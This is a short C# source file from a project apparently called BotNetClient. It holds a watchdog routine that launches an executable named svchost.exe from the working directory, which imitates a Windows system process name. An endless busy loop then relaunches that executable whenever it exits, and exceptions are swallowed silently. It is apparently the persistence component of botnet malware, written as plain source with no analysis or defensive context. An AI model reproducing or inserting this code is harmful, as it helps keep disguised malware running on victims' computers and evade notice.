using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace BotNetClient
{
    class SecondThread
    {
        public async static void miniprog()
        {
            await Task.Run(()=> {
                Process proc = new Process();
                proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe";
                try
                {
                    proc.Start();
                    while (true)
                    {
                        if (!proc.HasExited)
                        {

                        }
                        else
                        {
                            proc.Start();
                        }
                    }
                }
                catch (Exception ex)
                {
                    proc.Close();
                }
            });
        }
    }
}
